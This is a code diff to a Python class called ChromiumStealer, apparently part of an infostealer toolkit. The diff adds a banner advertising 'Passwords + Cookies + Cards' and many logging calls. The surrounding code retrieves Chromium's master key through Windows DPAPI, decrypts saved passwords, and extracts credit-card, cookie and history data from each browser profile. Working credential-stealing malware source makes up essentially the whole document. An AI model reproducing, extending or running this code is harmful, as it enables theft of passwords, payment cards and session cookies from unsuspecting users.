@@ -47,6 +47,17 @@ class ChromiumStealer(ModuleManager):
     def __init__(self) -> None:
         super().__init__(module_name="ChromiumStealer")
         
+        print("""
+         _______         _______ _                      _             
+        |.-----.|       (_______) |                    (_)            
+        ||x . x||        _      | |__   ____ ___  ____  _ _   _ ____  
+        ||_.-._||       | |     |  _ \ / ___) _ \|    \| | | | |    \ 
+        `--)-(--`       | |_____| | | | |  | |_| | | | | | |_| | | | |
+       __[=== o]___      \______)_| |_|_|   \___/|_|_|_|_|____/|_|_|_|
+      |:::::::::::|\    
+      `-=========-`()       Passwords + Cookies + Cards + Other
+              """)
+        
         self.browsers_folder = os.path.join(self.output_folder_user, 'browsers')
 
         appdata = os.getenv('LOCALAPPDATA')
@@ -83,6 +94,7 @@ class ChromiumStealer(ModuleManager):
         master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
         master_key = master_key[5:]
         master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
+        self.mdebug(f"Got Master Key for Chromium Browser at PATH: {path}")
         return master_key
 
 
@@ -92,7 +104,7 @@ class ChromiumStealer(ModuleManager):
         cipher = AES.new(master_key, AES.MODE_GCM, iv)
         decrypted_pass = cipher.decrypt(payload)
         decrypted_pass = decrypted_pass[:-16].decode()
-
+        self.mdebug(f"Descrypted a password to: {decrypted_pass}")
         return decrypted_pass
 
 
@@ -101,17 +113,21 @@ class ChromiumStealer(ModuleManager):
         
         if not os.path.isdir(save_path):
             os.makedirs(save_path)
+            self.mdebug(f"[{browser_name}] [{profile}] Created folder at {save_path}")
         
         filename = os.path.join(save_path, f'{data_type}.txt')
 
         if content:
             with open(filename, 'w', encoding='utf-8') as file:
                 file.write(content)
+                self.mprint(f"[{browser_name}] [{profile}] Saved content to {filename}")
         else:
-            print("No Data Found")
+            self.mdebug(f"[{browser_name}] [{profile}] No data found in {data_type}")
         
         if not os.listdir(save_path):
             os.rmdir(save_path)
+            self.mdebug(f"[{browser_name}] [{profile}] Removing empty folder to due lack of data: {save_path}")
+            self.merror(f"[{browser_name}] [{profile}] No {data_type} found")
 
 
     def __get_login_data(self, path: str, profile: str, master_key: bytes, browser_name: str) -> str:
@@ -120,26 +136,33 @@ class ChromiumStealer(ModuleManager):
         copy_path = os.path.join(self.browsers_folder, browser_name, profile) 
 
         if not os.path.exists(login_db):
+            self.merror(f"[{browser_name}] [{profile}] [passwords] Login data doesn't exist at {login_db}")
             return
+        
         if not os.path.isdir(copy_path):
             os.makedirs(copy_path)
+            self.mdebug(f"[{browser_name}] [{profile}] [passwords] Created folder at {copy_path}")
 
         copy_path = os.path.join(copy_path, 'login.db')
         if os.path.isfile(copy_path):
             os.remove(copy_path)
+            self.mdebug(f"[{browser_name}] [{profile}] [passwords] Removing 'login.db' that already exists at {copy_path}")
 
         shutil.copy(login_db, copy_path)
 
         conn = sqlite3.connect(copy_path)
         cursor = conn.cursor()
         cursor.execute('SELECT action_url, username_value, password_value FROM logins')
-
+        
+        self.mdebug(f"[{browser_name}] [{profile}] [passwords] Connected to copied 'login.db' and ran the query ")
+        
         for row in cursor.fetchall():
             password = self.__decrypt_password(row[2], master_key)
             result += f"""\nURL: {row[0]}\nEmail: {row[1]}\nPassword: {password}"""
             result += Constant.seperator
             
         conn.close()
+        self.mdebug(f"[{browser_name}] [{profile}] [passwords] Closing Database Connection and Returning fetched data ")
         return result
 
 
@@ -149,19 +172,25 @@ class ChromiumStealer(ModuleManager):
         copy_path = os.path.join(self.browsers_folder, browser_name, profile) 
         
         if not os.path.exists(cards_db):
+            self.merror(f"[{browser_name}] [{profile}] [cards] Web data doesn't exist at {cards_db}")
             return
+        
         if not os.path.isdir(copy_path):
             os.makedirs(copy_path)
+            self.mdebug(f"[{browser_name}] [{profile}] [cards] Created folder at {copy_path}")
         
         copy_path = os.path.join(copy_path, 'cards.db')
         if os.path.isfile(copy_path):
             os.remove(copy_path)
+            self.mdebug(f"[{browser_name}] [{profile}] [cards] Removing 'cards.db' that already exists at {copy_path}")
             
         shutil.copy(cards_db, copy_path)
         
         conn = sqlite3.connect(copy_path)
         cursor = conn.cursor()
         cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
+        
+        self.mdebug(f"[{browser_name}] [{profile}] [cards] Connected to copied 'cards.db' and ran the query ")
         
         for row in cursor.fetchall():
             if not row[0] or not row[1] or not row[2] or not row[3]:
@@ -172,6 +201,7 @@ class ChromiumStealer(ModuleManager):
             result += Constant.seperator
             
         conn.close()
+        self.mdebug(f"[{browser_name}] [{profile}] [cards] Closing Database Connection and Returning fetched data ")
         return result
 
 
@@ -181,19 +211,25 @@ class ChromiumStealer(ModuleManager):
         copy_path = os.path.join(self.browsers_folder, browser_name, profile) 
         
         if not os.path.exists(cookie_db):
+            self.merror(f"[{browser_name}] [{profile}] [cookies] Login data doesn't exist at {cookie_db}")
             return
+        
         if not os.path.isdir(copy_path):
             os.makedirs(copy_path)
+            self.mdebug(f"[{browser_name}] [{profile}] [cookies] Created folder at {copy_path}")
 
         copy_path = os.path.join(copy_path, 'cookies.db')
         if os.path.isfile(copy_path):
             os.remove(copy_path)
+            self.mdebug(f"[{browser_name}] [{profile}] [cookies] Removing 'cookies.db' that already exists at {copy_path}")
             
         shutil.copy(cookie_db, copy_path)
         
         conn = sqlite3.connect(copy_path)
         cursor = conn.cursor()
         cursor.execute('SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
+        
+        self.mdebug(f"[{browser_name}] [{profile}] [cookies] Connected to copied 'cookies.db' and ran the query ")
         
         for row in cursor.fetchall():
             if not row[0] or not row[1] or not row[2] or not row[3]:
@@ -204,6 +240,7 @@ class ChromiumStealer(ModuleManager):
             result += Constant.seperator
 
         conn.close()
+        self.mdebug(f"[{browser_name}] [{profile}] [cookies] Closing Database Connection and Returning fetched data ")
         return result
 
 
@@ -213,13 +250,17 @@ class ChromiumStealer(ModuleManager):
         copy_path = os.path.join(self.browsers_folder, browser_name, profile) 
         
         if not os.path.exists(web_history_db):
+            self.merror(f"[{browser_name}] [{profile}] [history] Login data doesn't exist at {web_history_db}")
             return
+        
         if not os.path.isdir(copy_path):
             os.makedirs(copy_path)
+            self.mdebug(f"[{browser_name}] [{profile}] [history] Created folder at {copy_path}")
 
         copy_path = os.path.join(copy_path, 'history.db')
         if os.path.isfile(copy_path):
             os.remove(copy_path)
+            self.mdebug(f"[{browser_name}] [{profile}] [passwords] Removing 'history.db' that already exists at {copy_path}")
 
         shutil.copy(web_history_db, copy_path)
         
@@ -250,13 +291,16 @@ class ChromiumStealer(ModuleManager):
         for browser, path in self.browsers.items():
             if os.path.exists(path):
                 results.append(browser)
+                self.mprint(f"Found {browser} Browser at {path}")
         return results
     
     
     def run(self):
         profiles = ["Default"]
-        for i in range(1, 11):
+        stuff = range(1, 11)
+        for i in stuff:
             profiles.append("Profile {number}".format(number=i))
+        self.mdebug(f"Looking for {len(stuff)} Profiles for each browser")
         
         available_browsers = self.installed_chromium_browsers()
 
